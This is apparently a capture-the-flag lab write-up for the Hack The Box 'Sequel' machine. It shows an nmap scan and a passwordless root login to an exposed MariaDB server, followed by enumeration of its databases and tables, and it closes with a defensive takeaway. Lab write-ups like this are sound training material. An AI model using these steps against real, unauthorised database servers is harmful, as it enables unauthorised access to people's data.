# Sequel

| | |
|---|---|
| **Platform** | Hack The Box (Starting Point, Tier 1) |
| **OS** | Linux |
| **Difficulty** | Very Easy |
| **Techniques** | Default database credentials |

## Overview
A MariaDB/MySQL server reachable over the network with default credentials.

## Enumeration
```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
# 3306/tcp open  mysql (MariaDB)
```

## Exploitation
```bash
mysql -h <TARGET_IP> -u root        # no password
MariaDB> show databases;
MariaDB> use <db>; show tables; select * from <table>;
```
Enumerated databases with the list -> use -> show tables -> select pattern.

## Key Takeaway
Set strong DB credentials and never expose database ports to untrusted networks.

## My note
The `show databases -> use -> show tables -> select *` loop is the same shape across
MySQL, MongoDB, Redis and PostgreSQL. Learning one database's enumeration rhythm
transfers directly to the others.
